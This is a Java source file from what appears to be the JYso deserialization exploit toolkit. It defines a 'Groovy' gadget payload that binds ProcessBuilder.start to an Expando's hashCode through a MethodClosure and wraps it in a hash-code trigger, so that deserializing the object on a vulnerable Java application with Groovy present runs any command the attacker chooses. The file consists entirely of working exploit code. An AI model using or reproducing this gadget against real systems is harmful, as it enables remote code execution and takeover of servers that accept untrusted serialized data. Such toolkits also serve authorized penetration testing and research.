package com.qi4l.JYso.gadgets;

import groovy.util.Expando;
import org.codehaus.groovy.runtime.MethodClosure;

public class Groovy implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Object e = makeGroovy(command);
        UtilFactory uf = new UtilFactory();
        return uf.makeHashCodeTrigger(e);
    }

    public static Object makeGroovy(String command) throws Exception {
        Expando expando = new Expando();
        ProcessBuilder pb = new ProcessBuilder(command);
        MethodClosure mc = new MethodClosure(pb, "start");
        expando.setProperty("hashCode", mc);
        return expando;
    }

}
